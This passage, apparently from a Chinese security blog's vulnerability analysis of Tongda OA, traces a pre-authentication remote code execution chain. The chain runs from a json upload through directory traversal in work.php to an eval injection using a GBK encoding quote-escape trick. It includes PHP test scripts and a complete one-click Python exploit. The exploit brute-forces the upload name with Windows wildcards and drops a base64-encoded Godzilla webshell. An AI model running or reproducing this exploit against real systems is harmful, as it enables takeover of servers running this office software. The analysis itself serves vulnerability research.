strrpos($ATTACH_NAME, &quot;.&quot;));$ATTACH_NAME = str_replace($EXT_NAME, strtolower($EXT_NAME), $ATTACH_NAME);$ATTACH_FILE = (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME) . &quot;.td&quot; : $ATTACH_NAME);$ATTACH_ID = mt_rand();$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;if (file_exists($FILENAME)) &#123;\t$ATTACH_ID = mt_rand();\t$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;&#125;\n\n最后的目录就长这样:\n$PATH = $PATH . &quot;/&quot; . $YM;$ATTACH_ID = mt_rand()$PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE\n\neval函数参数可控文件定位:inc\\package\\business\\AllVariableBusinessProcessing.php\n\n手动补了个括号,看看代码\n$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\n这行代码的作用是将变量 $variableData的数据从 UTF-8 编码转换为 GBK 编码，并且通过 eval函数执行转换后的字符串\n$variableData变量是这个backDataAnalysis方法传进来的参数,存在可控点,再看看有哪里用了这个方法\n\n在inc\\package\\DataTransport.php的backData()方法中调用了backDataAnalysis()方法，而在acceptData()方法中调用了backData()方法，继续看acceptData()方法的代码\npublic function backData($backData)&#123;\t$modular = $backData[&quot;modular&quot;];\tinclude_once &quot;inc/package/business/&quot; . $modular . &quot;BusinessProcessing.php&quot;;\t$BusinessProcess = $modular . &quot;BusinessProcessing&quot;;\t$BusinessProcessing = new $BusinessProcess();\t$organizeData = $BusinessProcessing-&gt;backDataAnalysis($backData);&#125;\n\npublic function acceptData($id)\t&#123;\t\t$json_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id . &quot;/&quot; . $id . &quot;.json&quot;;\t\t$data = $this-&gt;analysisJson($json_file);\t\t$query = &quot;select * from file_transfer_address where system_address =&#x27;&quot; . $data[&quot;send_url&quot;] . &quot;&#x27;&quot;;\t\t$cursor = exequery(TD::conn(), $query);\t\tif ($ROW = mysql_fetch_array($cursor)) &#123;\t\t\t$receive = $ROW[&quot;id&quot;];\t\t&#125;\t\tif ($data[&quot;type&quot;] == &quot;send&quot;) &#123;\t\t\t$modular = $data[&quot;modular&quot;];\t\t\tinclude_once &quot;inc/package/business/&quot; . $modular . &quot;BusinessProcessing.php&quot;;\t\t\t$BusinessProcess = $modular . &quot;BusinessProcessing&quot;;\t\t\t$BusinessProcessing = new $BusinessProcess();\t\t\t$new_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id;\t\t\t$data[&quot;fileAddress&quot;] = $this-&gt;getFile($id, $data[&quot;fileList&quot;]);\t\t\t$new_data = json_decode($data[&quot;organizeData&quot;], true);\t\t\t$new_data[&quot;fileAddress&quot;] = $data[&quot;fileAddress&quot;];\t\t\t$new_data[&quot;send&quot;] = $receive;\t\t\t$new_data[&quot;receive&quot;] = $receive;\t\t\t$new_data = json_encode($new_data);\t\t\t$dataAnalysis = $BusinessProcessing-&gt;dataAnalysis($new_data);\t\t\tif ($dataAnalysis) &#123;\t\t\t\t$runId = $data[&quot;Id&quot;];\t\t\t\t$query = &quot;select * from file_transfer_address where id = &#x27;999&#x27;&quot;;\t\t\t\t$cursor = exequery(TD::conn(), $query);\t\t\t\tif ($ROW = mysql_fetch_array($cursor)) &#123;\t\t\t\t\t$send_url = $ROW[&quot;system_address&quot;];\t\t\t\t&#125;\t\t\t\t$backData = array(&quot;id&quot; =&gt; $data[&quot;id&quot;], &quot;type&quot; =&gt; &quot;back&quot;, &quot;send_url&quot; =&gt; $send_url, &quot;send&quot; =&gt; $receive, &quot;receive&quot; =&gt; $receive, &quot;modular&quot; =&gt; $modular, &quot;dataAnalysis&quot; =&gt; $dataAnalysis);\t\t\t\t$json_file = $this-&gt;makeJson($backData);\t\t\t\t$redis = TRedis::redis();\t\t\t\t$message = array(&quot;json&quot; =&gt; $json_file, &quot;netid&quot; =&gt; $receive);\t\t\t\t$redis-&gt;hmset(&quot;syn:send:data:&quot; . $id, $message);\t\t\t\t$time = time();\t\t\t\t$redis-&gt;zadd(&quot;syn:orig:list&quot;, $time, $id);\t\t\t&#125;\t\t&#125;\t\telse &#123;\t\t\t$data[&quot;send&quot;] = $receive;\t\t\t$data[&quot;receive&quot;] = $receive;\t\t\t$this-&gt;backData($data);//在这里\t\t&#125;\t\treturn &quot;+OK&quot;;\t&#125;\n\n关注这几行代码:\npublic function acceptData($id)   &#123;       $json_file = MYOA_ATTACH_PATH2 . &quot;syn/recv/data/&quot; . $id . &quot;/&quot; . $id . &quot;.json&quot;;       $data = $this-&gt;analysisJson($json_file);       ......       $this-&gt;backData($data);&#125;\n\n而在/inc/package/work.php又调用了acceptData()方法,跟进看看\n&lt;?phpinclude_once &quot;inc/conn.php&quot;;include_once &quot;inc/utility_all.php&quot;;include_once &quot;inc/utility_file.php&quot;;include_once &quot;inc/TRedis/TRedis.php&quot;;$id = $_GET[&quot;id&quot;];include_once &quot;DataTransport.php&quot;;$DataTransport = new DataTransport();$state = $DataTransport-&gt;acceptData($id);echo $state;?&gt;\n\n可以发现这里的id是由GET方法传进来的,并没有任何校验,直接拼接到acceptData方法中\n其中$id直接传入到语句中，存在目录穿越，可以读取任意地方的 json 文件然后进行 json 格式解码后赋值给$data\n这里就和前面的文件上传组合起来构成一条利用链，剩下的就是要构造上传的文件内容,再捋一下之前的利用链,剩下的就是要构造上传的文件内容。\n$id可控-&gt;可读取任意目录下的json文件-&gt;将处理后的json交给inc\\package\\business\\AllVariableBusinessProcessing.php中的eval函数处理\n\n回到eval()函数点\n$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\n重点注意这几行代码即可\nstatic public function backDataAnalysis($BackData)\t&#123;\t\t$variableData = $BackData[&quot;dataAnalysis&quot;];\t\t$variableData = json_decode($variableData, true);\t\t$variableData = eval(&quot;return &quot; . iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, var_export($variableData, true) . &quot;;&quot;));\n\n因为这是个json文件，并且在前面的acceptData()方法中进行了json_decode()，所以文件内容需要为json格式，同时为了满足跳转到backDataAnalysis方法，构造如下\n&#123;&quot;modular&quot;:&quot;AllVariable&quot;,&quot;dataAnalysis&quot;:&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;bbb\\&quot;&#125;&quot;&#125;\n\n按照源码写一个测试脚本,如下\n&lt;?php$BackData = array(&quot;modular&quot;=&gt;&quot;AllVariable&quot;,&quot;dataAnalysis&quot;=&gt;&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;bbb\\&quot;&#125;&quot;);var_dump($BackData);dotast($BackData);function dotast($BackData)&#123;;    $variableData = $BackData[&#x27;dataAnalysis&#x27;];    $variableData = json_decode($variableData, true);    echo(iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));    $variableData = eval(&#x27;return &#x27; . iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));&#125;dotast($BackData);?&gt;\n\n\n如果我们能在bbb处逃逸出单引号，闭合剩下的语句，就可以实现代码执行，即想实现如下代码效果\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb&#x27;,eval(xxxx));/*&#x27;,);\n\n即使加上一个单引号,因为转义也会逃逸失败,\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb\\&#x27;,eval(xxxx));/*&#x27;,);\n\n如果再多出一个转义符号呢？多出的转义符会将第二个\\进行转义，实现单引号闭合，成功逃逸。所以我们接下来需要想办法构造出一个转义符\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb\\\\&#x27;,eval(xxxx));/*&#x27;,);\n\n注意看前面的代码echo(iconv(&#39;UTF-8&#39;, &#39;GBK&#39;, var_export($variableData, true) . &#39;;&#39;));，精彩的地方在于这里使用了iconv()把utf-8编码转成GBK编码，我们写一个 python 自动脚本帮我们寻找哪些汉字可以在进行转换后末尾带\\符号\nimport randomdef Unicode():    val = random.randint(0x4e00, 0x9fbf)    return chr(val)while 1:    create_s = Unicode()    for i in create_s:        test = i.encode(&#x27;gbk&#x27;)        for j in test:            if ascii(j) == &#x27;92&#x27;:                print(&#x27;ok:&#x27;, i)                &quot;&quot;&quot;                覾                &quot;&quot;&quot;\n\n使用汉字覾一枚，构成如下php测试脚本\n&lt;?php$BackData = array(&quot;modular&quot;=&gt;&quot;AllVariable&quot;,&quot;evil&quot;=&gt;&quot;ZmlsZV9wdXRfY29udGVudHMoJ2RvdGFzdC5waHAnLCc8P3BocCBwaHBpbmZvKCk7Jyk7&quot;,&quot;dataAnalysis&quot;=&gt;&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;覾&#x27;,eval(base64_decode(\\$BackData[evil])));/*\\&quot;&#125;&quot;);var_dump($BackData);dotast($BackData);function dotast($BackData)&#123;;    $variableData = $BackData[&#x27;dataAnalysis&#x27;];    $variableData = json_decode($variableData, true);    //var_dump($variableData);    echo(iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));    $variableData = eval(&#x27;return &#x27; . iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));&#125;dotast($BackData);?&gt;\n\n运行之后确实生成了dotast.php\n\n组合链我们已经知道/mobile/api/api.ali.php可以上传 json 文件，而inc\\package\\work.php可以实现读取 json 文件，可以组合起来形成一条代码执行的利用链。但还有一个问题需要解决，就是上传的文件名格式中存在一个随机数,无法猜测,也不能用?通配符\n但可以利用 windows 上的一个特性\nwindows系统在处理文件名的时候，FindFirstFileExW()/FindFirstFile()这两个API会对&lt; &gt; &quot;这三个字符做特殊处理，效果分别对应Linux下的通配符* ? .\n所以我们可以用&gt;来代替?实现匹配文件，如此便可成功构造出一条前台 getshell 利用链。最后使用 python 编写一键 getshell 脚本\nimport requestsimport timeurl = &quot;URL&quot;shell = &quot;ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2RvdGFzdC5waHAnLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLUUhObGMzTnBiMjVmYzNSaGNuUW9LVHNLUUhObGRGOTBhVzFsWDJ4cGJXbDBLREFwT3dwQVpYSnliM0pmY21Wd2IzSjBhVzVuS0RBcE93cG1kVzVqZEdsdmJpQmxibU52WkdVb0pFUXNKRXNwZXdvZ0lDQWdabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1JFS1Rza2FTc3JLU0I3Q2lBZ0lDQWdJQ0FnSkdNZ1BTQWtTMXNrYVNzeEpqRTFYVHNLSUNBZ0lDQWdJQ0FrUkZza2FWMGdQU0FrUkZza2FWMWVKR003Q2lBZ0lDQjlDaUFnSUNCeVpYUjFjbTRnSkVRN0NuMEtKSEJoYzNNOUozQmhjM01uT3dva2NHRjViRzloWkU1aGJXVTlKM0JoZVd4dllXUW5Pd29rYTJWNVBTY3pZelpsTUdJNFlUbGpNVFV5TWpSaEp6c0thV1lnS0dsemMyVjBLQ1JmVUU5VFZGc2tjR0Z6YzEwcEtYc0tJQ0FnSUNSa1lYUmhQV1Z1WTI5a1pTaGlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNrY0dGemMxMHBMQ1JyWlhrcE93b2dJQ0FnYVdZZ0tHbHpjMlYwS0NSZlUwVlRVMGxQVGxza2NHRjViRzloWkU1aGJXVmRLU2w3Q2lBZ0lDQWdJQ0FnSkhCaGVXeHZZV1E5Wlc1amIyUmxLQ1JmVTBWVFUwbFBUbHNrY0dGNWJHOWhaRTVoYldWZExDUnJaWGtwT3dvZ0lDQWdJQ0FnSUdsbUlDaHpkSEp3YjNNb0pIQmhlV3h2WVdRc0ltZGxkRUpoYzJsamMwbHVabThpS1QwOVBXWmhiSE5sS1hzS0lDQWdJQ0FnSUNBZ0lDQWdKSEJoZVd4dllXUTlaVzVqYjJSbEtDUndZWGxzYjJGa0xDUnJaWGtwT3dvZ0lDQWdJQ0FnSUgwS0NRbGxkbUZzS0NSd1lYbHNiMkZrS1RzS0lDQWdJQ0FnSUNCbFkyaHZJSE4xWW5OMGNpaHRaRFVvSkhCaGMzTXVKR3RsZVNrc01Dd3hOaWs3Q2lBZ0lDQWdJQ0FnWldOb2J5QmlZWE5sTmpSZlpXNWpiMlJsS0dWdVkyOWtaU2hBY25WdUtDUmtZWFJoS1N3a2EyVjVLU2s3Q2lBZ0lDQWdJQ0FnWldOb2J5QnpkV0p6ZEhJb2JXUTFLQ1J3WVhOekxpUnJaWGtwTERFMktUc0tJQ0FnSUgxbGJITmxld29nSUNBZ0lDQWdJR2xtSUNoemRISndiM01vSkdSaGRHRXNJbWRsZEVKaGMybGpjMGx1Wm04aUtTRTlQV1poYkhObEtYc0tJQ0FnSUNBZ0lDQWdJQ0FnSkY5VFJWTlRTVTlPV3lSd1lYbHNiMkZrVG1GdFpWMDlaVzVqYjJSbEtDUmtZWFJoTENSclpYa3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMEtmUW89IikpOw==&quot;dir_path1 = time.strftime(&#x27;%y%m&#x27;,time.localtime(time.time()))dir_path2 = &#x27;dotast&#x27;files = &#123;&quot;file&quot;:(dir_path2+&quot;.json&quot;,&#x27;&#123;&quot;modular&quot;:&quot;AllVariable&quot;,&quot;dotast&quot;:&quot;%s&quot;,&quot;dataAnalysis&quot;:&quot;&#123;\\\\&quot;abc\\\\&quot;:\\\\&quot;覾\\&#x27;,eval(base64_decode($BackData[dotast])));/*\\\\&quot;&#125;&quot;&#125;&#x27;%shell, &quot;application/octet-stream&quot;)&#125;res1 = requests.post(url+&quot;/mobile/api/api.ali.php&quot;,files=files)for i in range(12,4,-1):    dir_path0 = &#x27;&gt;&#x27;*i    source_code = requests.get(url+&quot;/inc/package/work.php?id=../../../../../myoa/attach/approve_center/&#123;dir_path1&#125;/&#123;dir_path0&#125;.&#123;dir_path2&#125;&quot;.format(dir_path1=dir_path1,dir_path0=dir_path0,dir_path2=dir_path2))    if &quot;OK&quot; in source_code.text:        print(f&quot;\\033[1;34m[*]生成哥斯拉shell: &#123;url&#125;/dotast.php  默认密码\\033[0,&quot;)        exit()\n\n参考链接https://forum.butian.net/share/2049\n审计源码的师傅真强…\n","categories":["通达oa 漏洞分析"],"tags":["通达oa 漏洞分析"]}]